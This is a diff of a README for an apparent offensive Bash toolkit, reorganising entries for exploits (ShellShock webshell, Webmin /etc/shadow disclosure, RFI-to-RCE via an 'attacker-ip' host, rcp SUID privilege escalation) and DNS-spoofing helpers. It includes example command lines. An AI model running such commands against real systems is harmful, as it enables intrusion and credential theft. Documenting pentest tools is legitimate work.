@@ -11,6 +11,22 @@ $files=$(ls | grep ".sh")
 for f in $files; do cp "$f" /usr/local/bin/"${f%.sh}"; done
 ```
 
+#### BASH EXPLOITS
+- __CVE-2014-6271.sh__ This exploit is used to execute commands on a remote server vulnerable to the CVE-2014-6271 ShellShock vulnerability. It creates a webshell at /var/www/html/simple.php and uses curl to simulate a shell like session. Currently only able to issue one word commads. I plan adding more functionality in the future.
+![ShellShock CVE-2015-6271](https://raw.githubusercontent.com/tobor88/Bash/master/shellshock.png)
+
+- __CVE-2006-3392.sh__ This exploit is used to perform an unauthenticated remote file disclosure on Webmin version <1.29x.
+```bash
+./CVE-2006-3392.sh 10.11.1.141 10000 http /etc/shadow
+```
+![CVE-2006-3392](https://raw.githubusercontent.com/tobor88/Bash/master/cve20063392.png)
+
+- __rfi-rce.sh__ This is a command that can be used to simplify RCE through a remote file inclusion vulnerability by exploiting it in a shell like fashion.
+```bash
+rfi-rce -f /var/www/html/evil.txt -u "http://target-ip/section.php?page=http://attacker-ip/evil.txt"
+```
+![rfi-rce.sh](https://raw.githubusercontent.com/tobor88/Bash/master/rfi-rce.png)
+
 #### BASH COMMANDS
 - __readid.sh__ This is complete. (Disaplys the /etc/passwd, /etc/shadow, or /etc/group files into an easy to read format)
 
@@ -49,12 +65,6 @@ for f in $files; do cp "$f" /usr/local/bin/"${f%.sh}"; done
  
  The issue I noticed came from another script came from a website in the bash script. This is because the slash is viewed as an escape character. Any contributions are welcome. This is still a work in progress.
 
-- __rfi-rce.sh__ This is a command that can be used to simplify RCE by exploiting it in a shell like fashion.
-```bash
-rfi-rce -f /var/www/html/evil.txt -u "http://target-ip/section.php?page=http://attacker-ip/evil.txt"
-```
-![rfi-rce.sh](https://raw.githubusercontent.com/tobor88/Bash/master/rfi-rce.png)
-
 - __enablespoofing.sh__ This is a simple script meant to take care of the tasks neccessary to allow dns spoofing on Kali Linux. It enables port forwarding on ipv4 and allows DNS traffic.
 
 - __dnslookup.sh__ This command is meant to perform a mas dns lookup based on an IPv4 address range. Returns output in the below format
@@ -74,15 +84,6 @@ rfi-rce -f /var/www/html/evil.txt -u "http://target-ip/section.php?page=http://a
 dns1.osbornepro.com.
 dns2.osbornepro.com.
 ```
-- __CVE-2014-6271.sh__ This exploit is used to execute commands on a remote server vulnerable to the CVE-2014-6271 ShellShock vulnerability. It creates a webshell at /var/www/html/simple.php and uses curl to simulate a shell like session. Currently only able to issue one word commads. I plan adding more functionality in the future.
-![ShellShock CVE-2015-6271](https://raw.githubusercontent.com/tobor88/Bash/master/shellshock.png)
-
-- __CVE-2006-3392.sh__ This exploit is used to perform an unauthenticated remote file disclosure on Webmin version <1.29x.
-```bash
-./CVE-2006-3392.sh 10.11.1.141 10000 http /etc/shadow
-```
-![CVE-2006-3392](https://raw.githubusercontent.com/tobor88/Bash/master/cve20063392.png)
-
 - __rcp-suid-privesc.sh__ This can be used to exploit the SUID bit on rcp. This only works on certain Operating Systems. Successfully tested on Red Hat 6.2. THere is a perl version of this script on exploitdb.
 
 - __suidcheck.sh__ Needs a lot of work (Checks for exploitable suid bits and attempts to exploit them if they exist. Also returns cron job scripts)
